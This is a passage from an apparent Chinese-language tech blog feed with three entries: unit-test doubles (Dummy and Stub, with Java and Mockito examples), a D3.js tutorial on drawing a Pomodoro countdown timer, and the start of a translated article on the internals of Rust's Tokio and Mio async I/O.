建一個 Person 可能開銷過大，而且很麻煩。況且 Person 並不是這個 test 的重點。
這時候就要來個簡單的 Dummy。
public class DummyPerson extends Person &#123;   public DummyPerson() &#123;&#125;&#125;
這個 class 的目的就是要通過 addPerson 的型別限制，所以只要 extends Person 就可以。
public class PeopleTestWithDummy&#123;  @Test  public void testGetNumberOfPerson()&#123;    People people = new People();    people.addPerson(new DummyPerson());    people.addPerson(new DummyPerson());    assertEquals(2, people.getNumberOfPerson())  &#125;&#125;

就是這麼簡單，Person 的其他 method 我們都全部不管，那如果 getNumberOfPerson 呼叫了 Person 的其他 method 我們無法知道，但這也不是這個 unit test 在乎的重點。
但如果你真的想確保其他 method 不會被 call，那就在 DummyPerson 裡面覆寫 Person 的其他 method。然後都 throw Exception 就可以。
其實很多人在測試的時候，直接傳 null 進去，如果你要傳進去的 function 沒有 nullCheck，這也是個可行的方式。但如果有 nullCheck 那還是只能用 Dummy。
Mockito - Dummy如果你寫的是 java，你會很常看到 Mickito。在 Mockito 裡面，如何生一個 Dummy object 呢?
public class PeopleTestWithDummy&#123;  @Test  public void testGetNumberOfPerson()&#123;    People people = new People();    people.addPerson(mock(Person.class));    people.addPerson(mock(Person.class));    assertEquals(2, people.getNumberOfPerson())  &#125;&#125;

小心不要被這裡的 mock 搞混，他只是 syntax 是 mock，但在 mockito 裡面，如果你只 mock 一個 class 但沒有給他任何預期的行為，他就是個dummy。
我們是以用法來區分 TestDoubles，不是 syntax，因為很多 framework 不會為每一個 TestDoubles 都給一個專屬 syntax。
StubStub 是我們介紹的替身中第一個可以讓我們獨立測試 SUT 的測試替身。
Stub 使用時機當我們需要測試一個 SUT，但我們卻不想要依賴真實的 DOC，我們可以用 Stub 去取代我們的 DOC。
Stub 並不需要真的表現的跟 DOC 一樣。他只要 api 長得一樣(也就是輸入輸出長得一樣)，讓 SUT 以為是真正的 DOC 就可以。
來個例子，今天我們想測試 getSecretNumber 是不是能正確回傳。
public class WebServer &#123;  private Database database;  int secretNumber;  public WebServer(Database database)&#123;    this.database = database;    secretNumber = 42;  &#125;  public int getSecretNumber(String username,String password)&#123;    return database.authorize(username, password) ?        secretNumber : -1;  &#125;&#125;public class Database &#123;  public Database()&#123;  &#125;  public boolean authorize(String username, String password)&#123;    //Connect to database    //Query database    //etc  &#125;&#125;
程式碼裡面，我們需要去 authorize，這一步會花費很多時間，這也不是現在這個測試的重點。這時候就來個 Stub。
public class DatabaseStub extends Database &#123;  public boolean authorize(String username, String password) &#123;    return true;  &#125;&#125;public class TestWithStub&#123;  @Test  public void testGetSecretNumber()&#123;    WebServer webserver = new WebServer(new DatabaseStub());    assertEquals(42, webserver.getSecretNumber(&quot;BoYu&quot;, &quot;jyt&quot;));  &#125;&#125;

搞定，這樣就不用真的去 query database。
Mockito - Stub有 Mockito 的話，並不需要真的寫一個新的 DatabaseStub。
Database databaseStub = mock(Database.class);when(databaseStub.authorize(anyString(), anyString()))    .thenReturn(true);WebServer webserver = new WebServer(databaseStub);assertEquals(42, webserver.getSecretNumber(&quot;BoYu&quot;, &quot;jyt&quot;));
你把一個 class Mock 了之後，他的每一個 function 都只會回傳 null。你需要去指定你會用到的 method 的行為 輸入值是什麼回傳什麼。
測試特殊情況如介紹時所說，stub 還能模擬測試的特殊狀況。
在這個例子裡，你想知道如果 authorize 不過，是不是回傳 -1。就把剛剛 stub 的回傳值改成 false 就可以。
Database databaseStub = mock(Database.class);when(databaseStub.authorize(anyString(), anyString()))    .thenReturn(false);WebServer webserver = new WebServer(databaseStub);assertEquals(-1, webserver.getSecretNumber(&quot;BoYu&quot;, &quot;jyt&quot;));
還可以讓你的 Stub throw exception。
when(databaseStub.authorize(anyString(), anyString()))  .thenThrow(new NullPointerException());

完全不用依賴真正的 DOC，隨便你愛怎麼玩就怎麼玩。
當你的 SUT 有一些 indirect input(並不是在你測試的程式提供的 input，而是 DOC 提供的 input)，需要事先定義好 DOC 的回傳值，就是用 Stub。
總結本文介紹了何謂測試替身以及測試替身的目的，還介紹了 Dummy 和 Stub 兩種替身，下一篇會介紹另外三種測試替身，儘請期待。
延伸閱讀
我聊的不是金庸 是測試替身

關於作者：@jyt0532 後端工程師，喜歡學習新知挑戰新事物，最近在寫一本關於JVM的教學書。
]]></content>
      <tags>
        <tag>unitTest testDouble</tag>
      </tags>
  </entry>
  <entry>
    <title>詳解簡易 Timer 來學習 D3</title>
    <url>/2016/10/22/timer-d3-v4/</url>
    <content><![CDATA[The Pomodoro Technique 是一個簡易又廣為人知的時間管理方法，其主軸在於將工作時段切割成多個蕃茄時間，每個蕃茄時間包含：

25 分鐘的執行時間
5 分鐘的休息時間

蕃茄工作法 wiki詳細內容不管是網路上，或是書籍都有許多描述，有興趣深入了解的可以去看看。
今天重點不在番茄工作法。
重點在，番茄工作法中不可或缺的工具 - 計時器！
我用過幾款 Chrome extension 的計時器，但剩餘時間都是用數字來顯示，而我想要的是用圖像的方式來呈現，這樣我的大腦可以省略掉辨識數字的時間（是會花你多少時間… XD），也因為沒有了數字，不知道確切剩餘時間，不會看剩一分鐘就因為緊張而分心（至少對我而言啦~）。
所謂圖像的呈現方式就像下面的成品，輸入完你想要的倒數時間後，按下enter，就會看到倒數的區塊以及倒數秒數。
See the Pen Timer-d3-v4 by Arvin (@arvin0731) on CodePen.

[Inspired by @ericbullington](https://www.ericbullington.com/blog/2012/10/27/d3-oclock/)

一開始本來想說看能不能直接用 html、css 把圖畫出來，但要計算弧度畫出扇型感覺有點麻煩，好在我們有 D3.js 這個方便的工具！除了拿來資料視覺化外，d3.js 提供的許多 lib 都很適合拿來單純作畫。並且，實作計時器的難度並不高，非常適合初學者來學習 D3.js，又比畫出長條圖等來得有成就感！（或是像我ㄧ樣很久沒碰 d3，又想稍稍複習一下的人也可以看看！）
因此，今天就來說明如何利用 D3.js 來繪製 Time timer！並在最後解釋一點 D3 data join 的概念。
Make a plan &amp; Prepare your data在打開你的編輯器開始 coding 之前，讓我們先停下來想一下，繪製計時器你大概會需要哪些東西。

你需要一個圓圈代表時鐘。

你需要一個秒針，讓你知道時間不斷在跑。

你需要一個會隨著時間流逝而縮小面積的扇行區塊。

你需要一個輸入筐，讓使用者輸入想要倒數的時間。


先不管圓圈、秒針與扇形該怎麼畫，D3.js 比較不一樣的地方在於它是 data-driven，所以我們需要先把資料給準備好，而繪製計時器所需要的資料就是時間。
在我們的 case 裡面，時間是使用者輸入的數字，我們要將其 parse 為適合的資料格式：
const timeData = (minutes, sec) =&gt; &#123;  return [    &#123;      &quot;unit&quot;: &quot;seconds&quot;,      &quot;numeric&quot;: sec    &#125;, &#123;      &quot;unit&quot;: &quot;minutes&quot;,      &quot;numeric&quot;: minutes    &#125;  ];&#125;;

此外，一般繪製 D3.js 都是一次性的，也就是讀入資料後，根據該次讀入的資料繪製圖形。我們需要的則是類似 streaming data 的行為，不間斷的傳入目前時間，讓 D3 幫我們繪製出對應的圖形。作法有很多種，這邊採用最簡單的做法：setInterval
let timer;const startTimer = (e) =&gt; &#123;  // Main program    if (isNaN(e.target.valueAsNumber)) &#123;      clearInterval(timer);      clockGroup.selectAll(&quot;.clockhand&quot;).remove();      return;    &#125;;    clearInterval(timer);    let data;    let timeAsSec = e.target.valueAsNumber * 60;    let sec = 0;    timer = setInterval(() =&gt; &#123;      data = timeData(timeAsSec / 60, sec);      sec = sec + 1;      timeAsSec = timeAsSec - 1;      // render() 為繪製 d3 的函式      render(data);      if (timeAsSec === 0) &#123;        clearInterval(timer);      &#125;    &#125;, 1000);&#125;;let timeInput = document.querySelector(&#x27;#time&#x27;);timeInput.addEventListener(&quot;change&quot;, startTimer);

startTimer 是綁定在 input field 的 EventListener，我們根據使用者輸入的數字乘上 60 轉換為需要執行的總秒數(timeAsSec)。目的是為了能夠適時（倒數結束）的跳出 setInterval()。
在 setInterval() 中，我們每秒執行一次，遞減 timeAsSec，同時遞增 sec 用以讓秒針轉動。
將 timeAsSec 與 sec 傳入剛剛的 timeData() 產生 D3 需要的資料格式。這邊我們直接將 timeAsSec 除以 60，結果會是分數，因此我們的分鐘區塊會隨著秒數的增加而順順的減少，若你想要有明顯跳動，可以轉為整數後再丟入 timeData（轉為整數的話，只有每 60 秒數值會變動一次，才看得到差別）。
總結一下整個流程：
每秒執行一次，從 timeData 中產生新的資料傳入 render() 去繪製圖形，直到 timeAsSec 遞減為零。
Render Setting資料都設定好後，接著準備繪製圖形。
// value settinglet width = 300;let height = 200;let offSetX = 150;let offSetY = 100;let pi = Math.PI;let scaleSecs = d3.scaleLinear().domain([0, 59 + 999 / 1000]).range([0, 2 * pi]);let scaleMins = d3.scaleLinear().domain([0, 59 + 59 / 60]).range([0, 2 * pi]);let vis = d3.selectAll(&quot;.chart&quot;)  .append(&quot;svg:svg&quot;)  .attr(&quot;width&quot;, width)  .attr(&quot;height&quot;, height);let clockGroup = vis.append(&quot;svg:g&quot;)  .attr(&quot;transform&quot;, &quot;translate(&quot; + offSetX + &quot;,&quot; + offSetY + &quot;)&quot;);clockGroup.append(&quot;svg:circle&quot;)  .attr(&quot;r&quot;, 80).attr(&quot;fill&quot;, &quot;none&quot;)  .attr(&quot;class&quot;, &quot;clock outercircle&quot;)  .attr(&quot;stroke&quot;, &quot;black&quot;)  .attr(&quot;stroke-width&quot;, 2);clockGroup.append(&quot;svg:circle&quot;)  .attr(&quot;r&quot;, 4)  .attr(&quot;fill&quot;, &quot;black&quot;)  .attr(&quot;class&quot;, &quot;clock innercircle&quot;);

line 2 ~ line 6 先定義一些常數，這邊就隨意設定。

line 8 ~ line 9 設定 Mins 與 Secs 的 scale。scale 是什麼？基本上你可以把 scale 想像成是能夠幫你把 資料映射 到適合你想繪製圖形的維度上 的一種方法。
let scaleSecs = d3.scaleLinear().domain([0, 59 + 999 / 1000]).range([0, 2 * pi]);let scaleMins = d3.scaleLinear().domain([0, 59 + 59 / 60]).range([0, 2 * pi]);

透過 domain 與 range 來分別給予 資料的輸入範圍 以及 資料的輸出範圍，以今天的 case 來說，我們要將時間資料轉化為圓形的角度，因此給予 domain 的輸入範圍為 0 ~ 59。
range 負責輸出的範圍，我們要在圓形的時鐘上顯示，因此是 0 ~ 2 * pi。
到這邊你可能會想，degree 0 跟 degree 360 不是一樣嗎？這樣 0 秒跟 59 秒會映射到同一個點？
好問題！所以先前的 seconds 與 minutes 基本上可以共用，但如果想要區別 0 秒與 59 秒，我們需要把範圍多加上小數點的範圍，以分鐘來說，分成 60 等份，因此就是 [0, 59 + 59&#x2F;60]，秒則是分為 1000 毫秒，也就是 [0, 59 + 999&#x2F;1000]。
line 11 ~ line 14 由於 d3 的 method 是 Chainable 的，因此可利用 d3.selectAll() 選取你想要 mount 上去的 DOM 元素，並接著 append 上 svg 元素，以及設定 width 與 height 的屬性值。
let vis = d3.selectAll(&quot;.chart&quot;)  .append(&quot;svg:svg&quot;)  .attr(&quot;width&quot;, width)  .attr(&quot;height&quot;, height);

line 16 ~ line 28 採用同樣方式，在 vis 這個 svg 元素下，再 append 上一個 svg group，並加入兩個 circle。
第一個 circle 是時鐘的外圍，第二個 circle 作為時鐘中心點。
Render Timer終於可以開始畫圖！
// render clockconst render = (data) =&gt; &#123;  let minuteArc, secondArc;  clockGroup.selectAll(&quot;.clockhand&quot;).remove();    secondArc = d3.arc()    .innerRadius(0)    .outerRadius(70)    .startAngle((d) =&gt; &#123;    return scaleSecs(d.numeric);  &#125;)    .endAngle((d) =&gt; &#123;    return scaleSecs(d.numeric);  &#125;);    minuteArc = d3.arc()    .innerRadius(0)    .outerRadius(80)    .startAngle((d) =&gt; &#123;    return 0;  &#125;)    .endAngle((d) =&gt; &#123;    return scaleMins(d.numeric);  &#125;);  clockGroup.selectAll(&quot;.clockhand&quot;)    .data(data)    .enter()    .append(&quot;svg:path&quot;)    .attr(&quot;d&quot;, (d) =&gt; &#123;      if (d.unit === &quot;seconds&quot;) &#123;        return secondArc(d);      &#125; else if (d.unit === &quot;minutes&quot;) &#123;        return minuteArc(d);      &#125;    &#125;)    .attr(&quot;class&quot;, &quot;clockhand&quot;)    .attr(&quot;stroke&quot;, (d) =&gt; &#123;      if (d.unit === &quot;seconds&quot;) &#123;        return &quot;black&quot;;      &#125; else if (d.unit === &quot;minutes&quot;) &#123;        return &quot;blue&quot;;      &#125;    &#125;)    .attr(&quot;stroke-width&quot;, (d) =&gt; &#123;      if (d.unit === &quot;seconds&quot;) &#123;        return 2;      &#125; else if (d.unit === &quot;minutes&quot;) &#123;        return 3;      &#125;    &#125;)    .attr(&quot;fill&quot;, &quot;red&quot;)    .attr(&quot;opacity&quot;, &quot;0.8&quot;);&#125;;

line 8 ~ line 26 定義了兩個 method: secondArc 和 minuteArc，分別用來將傳入的資料依據其所設定的 innerRadius 、 outerRadius 、 startAngle 與 endAngle 來繪製成弧形。 d3.arc() 在 d3 v4 中屬於 d3-shape 的一環。

在 endAngle() 中，我們將接收到的參數（也就是傳入的資料）放入我們先前定義好的 scaleSecs() 與 scaleMins() 中，讓 d3.arc() 能接收到我們映射過後的值，進而繪出正確的 scale。
我們讓秒針的 startAngle 與 endAngle 設定為一樣，以呈現 針 的狀態。而 分鐘區塊 則讓其 startAngle 固定為 0，只在 endAngle 中傳入每次更新的時間，如此一來，每次時間更新時，區塊會隨之改變大小！
此外，這邊的innerRadius 都設為 0，讓其等同於圓中心，才能產生扇形。
line 28 ~ line 56 ： 還記得最一開始我們有將最外層的 svg 指定給變數 clockGroup 嗎？
let clockGroup = vis.append(&quot;svg:g&quot;)  .attr(&quot;transform&quot;, &quot;translate(&quot; + offSetX + &quot;,&quot; + offSetY + &quot;)&quot;);    ...  ..  .  clockGroup.selectAll(&quot;.clockhand&quot;)    .data(data)    .enter()    .append(&quot;svg:path&quot;)

在最後一段裡面，利用 clockGroup.selectAll(&quot;.clockhand&quot;) 我們把資料 import 到擁有 .clockhand 這個 classname 的 svg:path 底下，透過設置 svg:path 的 attribute d來繪製 秒針 與 分鍾區塊（利用先前提到的 secondArc() 與 minuteArc() ）。
attr() 函式可以接受 callback，所以我們可以根據資料的不同來設定不同的 style，讓秒針與分鍾區塊做個分別。
不知道大家看到這邊有沒有覺得奇怪，從最一開始到現在從來沒有設置過 .clockhand 這個 class 的 DOM 元素，為什麼我們這邊可以直接 selectAll 還塞入資料並 append svg 呢？
原因是在於，d3 的 selectAll(), select() 如果找不到所指定的元素時，會回傳一個空的 NodeList，所以我們可以拿這個空 NodeList 去進行操作。但要記得在你 append 上去的 DOM 元素中加上你想指定的 classname，否則每次執行這個函數的時候，他就會重新 create 一個空的 NodeList。
這會造成什麼問題呢？以我們這邊實作的例子來說，在我們的 render() 一開始的地方，我們有個
clockGroup.selectAll(&quot;.clockhand&quot;).remove();

這個 remove() 的動作會在我們每次執行 render() 的時候（也就是 setInterval 每次執行時）幫我們把原先的 .cockhand DOM 拿掉，重新繪製正確的 秒針 與 分鐘區塊。
若我們在 append svg:path 的時候設定他的 attr 為 clockhand，則會造成這邊抓不到 .clockhand 而無法移除原有的 DOM（秒針與分鐘區塊）。
像是這樣：

因此記得要加上對應的 class name。
另外一個要注意的部分是，clockGroup.selectAll(&quot;.clockhand&quot;).remove(); 他雖然會移除掉 DOM 元素，但是 clockGroup.selectAll(&quot;.clockhand&quot;) 還是會留存有對原本該 DOM 元素的 reference，有可能會造成 memory leak，若想避免記得額外處理這部分。
小總結 與 附錄到這邊為止我們就已經實作出一個簡易的 Timer，希望能讓大家對 d3 繪圖有一點概念，至於再進階一點的，像是互動與動畫的部分，時間實在不多，只能下次再努力找個範例來寫寫。
Data join不過我想稍微介紹一點關於 D3 裡面很重要的 Data join，對之後實作更複雜的圖形時有絕對幫助。
先給點資源：
D3 作者關於 data join 的說明（必看）：Thinking with joins
UNC 的 data join 視覺化教學（也是必看, 上面那篇太長看不下去直接看這邊可以秒懂）：Dat joins in D3.js
在我們先前的範例裡面，有用到 clockGroup.selectAll(&quot;.clockhand&quot;).data().enter()，意思是將資料跟 DOM 連接，並將進入 enter 選取狀態 的資料傳遞到後面的 method （像是 attr()）中。
嗯？！ enter() 不是指把資料 enter (輸入) 進去的意思喔！
是，也不是。

在 D3 中，資料在繫結到 DOM 上時，會分別進入三種選取狀態：enter, update 與 exit。
[Note] selection 代表的是 selectAll() 或 select() 所選取到的 d3 node object。
update selection: 當你 selection 中的資料與新的 .data()傳遞進來的資料有重疊時，新的資料會進入 update selection 狀態，可以進行資料更新。
exit selection: 當你原本 selection 中的資料與新的資料沒有匹配時，那些舊有的資料會進入 exit selection 狀態，可以透過呼叫 .exit().remove() 將之從 selection 中移除。
enter selection: 與 update 相反，在原本 selection 中找不到對應的新資料就會進入 enter selection。
所以，當你想要在原本的圖形內更新資料時，可以直接呼叫 selectAll(&#39;.oldData&#39;).data(newData)，該進入 update 狀態的資料就會取代掉舊的，接著再呼叫 selectAll().exit().remove() 移除掉其他不再 newData 內的資料，最後呼叫 selectAll().enter().append() 來把不在舊資料中，但在 newData 中的資料新增上去。
強力推薦搭配參考 Dat joins in D3.js，裡面的範例非常清楚，有機會我會翻成中文版的。
了解資料在 d3 中的狀態後，對於後續設計互動效果與資料更新等等的操作會更得心應手！
參考資料
Thinking with joins
Dat joins in D3.js
d3-oclock

關於作者：@arvinh 前端攻城獅，熱愛數據分析和資訊視覺化
]]></content>
      <tags>
        <tag>d3, timer, pomodoro</tag>
      </tags>
  </entry>
  <entry>
    <title>【譯】Tokio 內部機制：從頭理解 Rust 非同步 I/O 框架</title>
    <url>/2018/01/05/tokio-internal/</url>
    <content><![CDATA[
  



本文譯自 Tokio internals: Understanding Rust’s asynchronous I&#x2F;O framework from the bottom up。Thanks David Simmons for this awesome article!

Tokio 是 Rust 的開發框架，用於開發非同步 I&#x2F;O 程式（asynchronous I&#x2F;O，一種事件驅動的作法，可實現比傳統同步 I&#x2F;O 更好的延伸性、效能與資源利用）。可惜的是，Tokio 過於精密的抽象設計，招致難以學習的惡名。即使我讀完教程後，依然不認為自己充分內化這些抽象層，以便推斷實際發生的事情。
從前的非同步 I&#x2F;O 相關開發經驗甚至阻礙我學習 Tokio。我習慣使用作業系統提供的 selection 工具（例如 Linux epoll）當作起點，再轉移至 dispatch、state machine 等等。倘若直接從 Tokio 抽象層出發，卻沒有清楚了解 epoll_wait() 在何處及如何發生，我會覺得難以連結每個概念。Tokio 與 future-driven 的方法就好像一個黑盒子。
我決定不繼續由上而下的方法學習 Tokio，反其道而行，而是透過閱讀原始碼，確切理解具體實作是如何驅動從 epoll 事件到 Future::poll() 消耗 I&#x2F;O 的整個過程。我不會深入高層次的 Tokio 與 futures 使用細節，現有的教程 有更完整詳細的內容。除了簡短的小結，我也不會探討一般性的非同步 I&#x2F;O 問題，畢竟這些問題都可寫個獨立的主題了。我的目標是有信心讓 futures 與 Tokio 以我所認知的方式執行。
首先，有些重要的聲明。請注意，Tokio 正快速開發中，這裡所見所聞可能不久就會過時。這個研究中我用了 tokio-core 0.1.10、futures- 0.1.17 與 mio 0.6.10。由於我想從最底層理解 Tokio，我並不會考慮更高層次的套件如 tokio-proto 與 tokio-service。tokio-core 的事件系統本身有許多細節，為了精簡，我會盡量避開這些細項。我在 Linux 作業系統上研究 Tokio，而有些討論細節與作業系統相依，如 epoll。最後，這裡所有東西都是我這個 Tokio 新手的詮釋，可能會有錯誤或誤導。
Asynchronous I&#x2F;O in a nutshell同步 I&#x2F;O 程式會執行阻塞性的 I&#x2F;O 操作，直到操作完成。例如讀取會阻塞至資料抵達，寫入會阻塞線程直到欲傳遞的 bytes 送達 kernel。這些操作非常適合依序執行的傳統命令式程式設計。舉例來說，一個 HTTP 伺服器替每個新連線產生一個新線程，這個線程會讀取資料並阻塞線程直到接收完整的 request，之後處理請求，再來阻塞線程至資料完全寫入 response。這是個方法非常直觀，缺點是會阻塞線程，因此每個連線的線程要各自獨立，每個線程也需有自己的 stack。然而，線程開銷阻礙了伺服器處理大量連線的可延伸性（參閱 C10k problem)，對低階系統來說也不易負荷。
如果 HTTP server 使用非同步 I&#x2F;O 開發，換句話說，在同一個線程上處理所有 I&#x2F;O 操作。如此一來，所有活躍的連線以及 socket 監聽都會配置為非阻塞狀態（non-blocking），並在 event loop 中監控讀取與寫入是否就緒，進而在事件發生時分派給對應的處理程式（handler）。而每個連線都需維護自身的狀態與 buffer，如果一個處理程式一次僅能從 200 bytes 的 request 中讀取 100 個位元組（bytes），它就不能等待剩下的 bytes 而造成線程阻塞，處理程式必須將部分資料儲存在 buffer 中，設定當前的狀態為「讀取請求中」，並返回給 event loop。待到下一次連線調用的相同的處理程式，它才可讀取剩餘的 bytes 並將狀態轉為「寫入回應中」。如此的資源管理系統將會非常迅速，但同時也產生更複雜的 state machine 與容易出錯的毛病。
理想中的非同步 I&#x2F;O 框架應該要提供能寫出近似於同步 I&#x2F;O 的程式，但底層是 event loop 與 state machine。這對每個語言來說都很不容易，不過 Tokio 的實現已接近了。
The Tokio stack
Tokio 的技術棧由下列幾個部分組成：

The system selector。每個作業系統皆提供接收 I&#x2F;O 事件的工具，如 epoll（linux）、kqueue()（FreeBSD&#x2F;macOS），與 IOCP（Windows）。
Mio - Metal I&#x2F;O。Mio 是一個 Rust crate，提供低階通用的 I&#x2F;O API，內部處理特定作業系統的 selector 實作細節，所以你不需再處理這件事。
Futures。Futures 以強大的抽象來表示尚未發生的事物。這些 future 以許多好用的方式組合成另一新的複合 future 來代表一系列複雜的事件。這個抽象層足以通用於許多 I&#x2F;O 之外的事件，但在 Tokio 中，我們專注在利用 futures 開發非同步 I&#x2F;O state machines。
Tokio。tokio-core 提供一個中心的 event loop，這個 event loop 整合 Mio 回應 I&#x2F;O 事件，並驅動 futures 完成（completion）。
Your program。一個採用 Tokio 框架的程式，會以 futures 操作非同步 I&#x2F;O，並將這些 futures 傳遞給 Tokio 的 event loop 來執行。

Mio: Metal I&#x2F;OMio 旨在提供一系列低階的 I&#x2F;O API，允許調用端接收事件，如 socket 讀寫就緒狀態（readiness state）改變等。重點如下：

Poll 與 Evented。Mio 提供 Evented trait 來表示任何可當作事件來源的事物。在你的 event loop 中，你會利用 mio::Poll 物件註冊一定數量的 Evented，再調用 mio::Poll::poll 來阻塞 loop，直到一至多個 Evented 產生事件（或超時）。

System selector。Mio 提供可跨平台的 system selector 訪問，所以 Linux epoll、Windows IOCP、FreeBSD&#x2F;macOS kqueue()，甚至許多有潛力的平台都可調用相同的 API。不同平台使用 Mio API 的開銷不盡相同。由於 Mio 是提供基於 readiness（就緒狀態）的 API，與 Linux epoll 相似，不少 API 在 Linux 上都可以一對一映射。（例如：mio::Events 實質上是一個 struct epoll_event 陣列。）對比之下，Windows IOCP 是基於完成（completion-based）而非基於 readiness 的 API，所以兩者間會需要較多橋接。Mio 同時提供自身版本的 std::net struct 如 TcpListener、TcpStream 與 UdpSocket。這些 API 封裝 std::net 版本的 API，預設為非阻塞且提供 Evented 實作讓其將 socket 加入 system selector。

Non-system events。Mio 除了提供從 I&#x2F;O 所得的 readiness 狀態來源，也可以用來指示從 user-space 來的 readiness 事件（非系統事件）。舉例來說，當一個工作線程（worker thread）完成一單位的工作，它就可以向 event loop 發出完成信號。你的程式調用 Registration::new2() 以取得一個 (Registration, SetReadiness) 元組。Registration 是一個實作 Evented 且藉由 Mio 註冊在 event loop 的物件；而需要指示當前 readiness 狀態時，則會調用 SetReadiness::set_readiness。在 Linux 上，非系統事件通知以 pipe 實作，當調用 SetReadiness::set_readiness() 時，會將 0x01 這個位元組寫入 pipe 中。而 mio::Poll 底層的 epoll 會配置為監控 pipe 讀取結束，所以 epoll_wait() 會解除阻塞，而 Mio 就可以將事件傳遞到調用端。另外，無論註冊多少非系統事件，都只會在 Poll 實例化時建立唯一一個 pipe。


每個 Evented 的註冊皆與一個由調用端提供 usize 型別的 mio::Token 綁定，這個 token 將會與事件一起返回，以指示出對應的註冊資訊。這種作法很好地映射到 Linux 的 system selector，因為 token 可以放置在 64-bit 的 epoll_data union 中，並保持相同的功能。
這裡提供一個 Mio 操作的實際案例，下面是我們在 Linux 上使用 Mio 監控一個 UDP socket 的情況：

建立 socket。
 let socket = mio::net::UdpSocket::bind(    &amp;SocketAddr::new(        std::net::IpAddr::V4(std::net::Ipv4Addr::new(127,0,0,1)),        2000    )).unwrap();
 建立一個 Linux UDP socket，其中封裝一個 std::net::UdpSocket，再封裝在 mio::net::UdpSocket 中。這個 socket 為非阻塞性（non-blocking）。

建立 poll 實例。
 let poll = mio::Poll::new().unwrap();
 在這步驟，Mio 初始化 system selector、readiness 佇列（用於非系統事件），以及併發保護。當 readiness 佇列初始化時，會建立一個 pipe，讓 readiness 從 user-space 發出信號，而這個 pipe 的檔案描述符（file descriptor）會加入 epoll 中。每個 Poll 物件建立時，都會賦予一個獨特、遞增的 selector_id。

透過 poll 註冊 socket。
 poll.register(    &amp;socket,    mio::Token(0),    mio::Ready::readable(),    mio::PollOpt::level()).unwrap();
 UdpSocket 的 Evented::register() 被調用時，會將代理指向一個封裝的 EventedFd，這個 EventedFd 會將 socket 的 file descriptor 加入 poll selector 中（最終會調用 epoll_ctl(fepd, EPOLL_CTL_ADD, fd, &amp;epoll_event)，而 epoll_event.data 設置為傳入的 token 值）。當一個 UdpSocket 註冊後，selector_id 會設置到與傳入的 Poll 相同，從而與 selector 產生連結。

**在 event loop 中呼叫 poll()**。
 loop &#123;    poll.poll(&amp;mut events, None).unwrap();    for event in &amp;events &#123;        handle_event(event);    &#125;&#125;
 System selector（epoll_wait()）與 readiness 佇列將會輪詢（poll）新的事件。（epoll_wait() 會阻塞，但由於非系統事件是透過 pipe 出發 epoll，事件仍會即時處理。）這一系列組合的事件可供調用端處理。


Futures and TasksFutures 是從函數式程式設計借來的技術，一個尚未完成的運算會以一個 future 代表，而這些獨立的 future 可以組合起來，開發更複雜的系統。這個概念對非同步 I&#x2F;O 非常中用，因為在處理交易（transaction）的所有基礎步驟，都可以模化為合成 futures（combinded futures）。以 HTTP 伺服器為例，一個 future 讀取 request，會從接收到有效資料開始讀取到 request 結束，另一個 future 則會處理這個 request 並產生 response，再另一個 future 則會寫入 responses。
在 Rust 中，futures crate 實現了 futures。你可以透過實作 Future trait 來定義自己的 future，這個 trait 需實現 poll() 方法，這個方法會在需要時調用，允許 future 開始執行。poll() 方法會回傳一個錯誤（error），或回傳一個指示告知 future 仍在處理，或是當 future 完成時返回一個值。Future trait 也提供許多組合操作子（combinator）作為預設方法。
欲理解 futures，須先探討三個重要的概念：tasks、executors，以及 notifications，且需理解此三者該如何安排，才能在正確時間點調用 future 的 poll() 方法。每一個 future 都在一個 task 語彙環境（context）中執行。一個 task 只與一個 future 關聯，而這個 future 卻可能是一個合成的 future，驅動其他封裝的 futures。（舉例來說，多個 future 用 join_all() 組合操作子，串連成單一一個 future，或是兩個 future 利用 and_then() 組合操作子來依序執行。）
Task 與它的 futures 需要被一個 executor 執行。一個 executor 的責任是在正確時間點輪詢 task&#x2F;future，輪詢通常會在接收到執行進度開始的通知時。而這個通知將在一個實作 futures::executor::Notify trait 的物件調用 notify 時發布。這裡有個例子，是由 futures crate 所提供的非常簡單的 executor，在調用 future 上的 wait() 被呼叫。擷自原始碼：
/// Waits for the internal future to complete, blocking this thread&#x27;s/// execution until it does.////// This function will call `poll_future` in a loop, waiting for the future/// to complete. When a future cannot make progress it will use/// `thread::park` to block the current thread.pub fn wait_future(&amp;mut self) -&gt; Result&lt;F::Item, F::Error&gt; &#123;    ThreadNotify::with_current(|notify| &#123;        loop &#123;            match self.poll_future_notify(notify, 0)? &#123;                Async::NotReady =&gt; notify.park(),                Async::Ready(e) =&gt; return Ok(e),            &#125;        &#125;    &#125;)&#125;

給定一個融合 task 與 future 的 futures::executor::Spawn 物件，這個 executor 在迴圈中調用 poll_future_notify。這個 Notify 會成為 task 執行語彙環境的一部分，future 也會被輪詢。如果一個 future poll 方法回傳 Async::NotReady，表示 future 仍等待中，必須在往後再次輪詢。Notify object 會從 futures::task::current() 取得一個指向 task 的 handle，且在 future 有些進展時調用 notify() 方法。（當一個 future 被輪詢時，與該 future 相關的 task 訊息將會儲存到 thread-local 中，thread-local 可以透過 current() 存取取得。）上例中，如果輪詢回傳 Async::NotReady，executor 會阻塞至接收到通知。也許 future 在其他線程運算，在完成時調用 notify()；或是 poll() 方法在返回 Asynx::NotReady 之前，自身直接調用了 notify()（後者並不常見，因為理論上一個 poll() 在返回之前應該持續取得進展）。 
Tokio 的 event loop 行為上比簡單整合「 Mio 事件驅動 future 完成」來得精細。舉例來說，一個 Mio event 表示一個 socket 的 readiness（就緒狀態），最後會產生一個通知，足以告知相對應的 future 需要輪詢。
處理 future 時，Task 是最基礎的執行單元，且基本上就是綠色線程，提供協調式多工，允許在同一個系統線程有多個執行語彙環境。當一個 task 無法有所進展，會讓處理器先處理其他可執行的 task。我們必須理解的是，「通知」會發生在 task 層級而非 future 層級。當一個 task 被通知時，它會輪詢它連結的最高層級的 future，這會導致任何或是全部的 child future 同樣被輪詢。例如，如果一個 task 最高層級的 future 是一個以 join_all 組合的十個 future，而其中一個 future 安排要通知此一 task，則無論需不需要，全部十個 future 皆須接受輪詢。
Tokio’s interface with MioTokio 利用上述的 Mio 「非系統事件」，將 task 通知轉換為 Mio 的事件。在取得一個 Mio 的 (Registration、SetReadiness）元組後，Tokio 會將 Registration（一個 Evented）註冊至 Mio 的 poll （event loop）中，再將 SetReadiness 封裝在實作了 Notify trait 的 MySetReadiness 中。原始碼如下：
struct MySetReadiness(mio::SetReadiness);impl Notify for MySetReadiness &#123;    fn notify(&amp;self, _id: usize) &#123;        self.0.set_readiness(mio::Ready::readable())              .expect(&quot;failed to set readiness&quot;);    &#125;&#125;

